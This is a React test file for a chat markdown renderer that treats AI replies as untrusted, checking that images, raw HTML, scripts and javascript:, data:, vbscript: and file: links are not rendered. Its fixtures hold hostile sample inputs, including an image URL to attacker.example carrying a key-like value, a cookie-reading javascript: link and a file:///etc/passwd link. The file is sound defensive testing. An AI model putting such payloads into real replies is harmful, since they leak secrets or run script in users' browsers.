import { describe, it, expect } from "vitest";
import { render, screen } from "@testing-library/react";
import { ChatMarkdown } from "@/components/chat/ChatMarkdown";
import { safeUrl } from "@/lib/safeUrl";

describe("ChatMarkdown (replies are untrusted)", () => {
  it("never renders an image, so nothing loads without a click", () => {
    const { container } = render(
      <ChatMarkdown content={"Here: ![secret](https://attacker.example/x.png?d=AKIA123) done"} />
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("secret");
    expect(container.textContent).toContain("https://attacker.example/x.png?d=AKIA123");
  });

  it("does not render a javascript: link as a link", () => {
    const { container } = render(<ChatMarkdown content={"[click me](javascript:alert(document.cookie))"} />);
    expect(container.querySelector("a")).toBeNull();
    expect(screen.getByText("click me")).toBeInTheDocument();
  });

  it("drops data:, vbscript:, file: and relative links", () => {
    const { container } = render(
      <ChatMarkdown
        content={"[a](data:text/html,<b>x</b>) [b](vbscript:msgbox) [c](file:///etc/passwd) [d](/settings)"}
      />
    );
    expect(container.querySelector("a")).toBeNull();
  });

  it("renders https links safely and shows the real destination", () => {
    render(<ChatMarkdown content={"[OWASP guide](https://owasp.org/www-project-top-ten/)"} />);
    const link = screen.getByRole("link");
    expect(link).toHaveAttribute("href", "https://owasp.org/www-project-top-ten/");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer nofollow");
    expect(link).toHaveTextContent("(owasp.org)");
  });

  it("does not render raw HTML", () => {
    const { container } = render(
      <ChatMarkdown content={'<img src="https://attacker.example/p.gif"><script>alert(1)</script> text'} />
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
  });

  it("renders fenced code blocks", () => {
    const { container } = render(<ChatMarkdown content={"```ts\nconst a = 1;\n```"} />);
    expect(container.querySelector("pre code")?.textContent).toContain("const a = 1;");
  });
});

describe("safeUrl", () => {
  it("allows only http(s)", () => {
    expect(safeUrl("https://example.com/a")).toBe("https://example.com/a");
    expect(safeUrl("http://example.com")).toBe("http://example.com/");
    expect(safeUrl("  JavaScript:alert(1)")).toBe("");
    expect(safeUrl("mailto:a@b.c")).toBe("");
    expect(safeUrl("#top")).toBe("");
  });
});
